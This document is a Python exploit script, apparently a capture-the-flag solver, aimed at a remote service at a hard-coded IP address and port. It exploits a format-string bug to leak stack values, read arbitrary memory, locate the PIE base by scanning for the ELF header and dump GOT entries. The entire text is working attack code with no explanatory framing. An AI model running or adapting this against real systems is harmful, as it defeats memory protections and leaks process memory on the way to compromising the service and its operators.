#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.05)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)
def get_pie(s):
    a15=leak_lld(s,15); start=a15&~0xfff
    for d in range(0,0x20000,0x1000):
        X=start-d; r=readmem(s,X)
        if r.startswith(b'\x7fELF'): return X
    return None

s=newconn(); pie=get_pie(s)
print("pie=",hex(pie))
for off in range(0x3f00, 0x4060, 8):
    X=pie+off
    r=readmem(s,X)
    strb=r.split(b'AAAA')[0] if b'AAAA' in r else r
    if strb:
        # interpret as little-endian if it looks like a pointer
        if strb[-1] in (0x7b,0x7f) and len(strb)>=5:
            val=int.from_bytes(strb+b'\x00\x00','little')
            print(f"got+{off:#x} {strb!r} -> {hex(val)}")
        else:
            print(f"got+{off:#x} {strb!r}")
s.close()
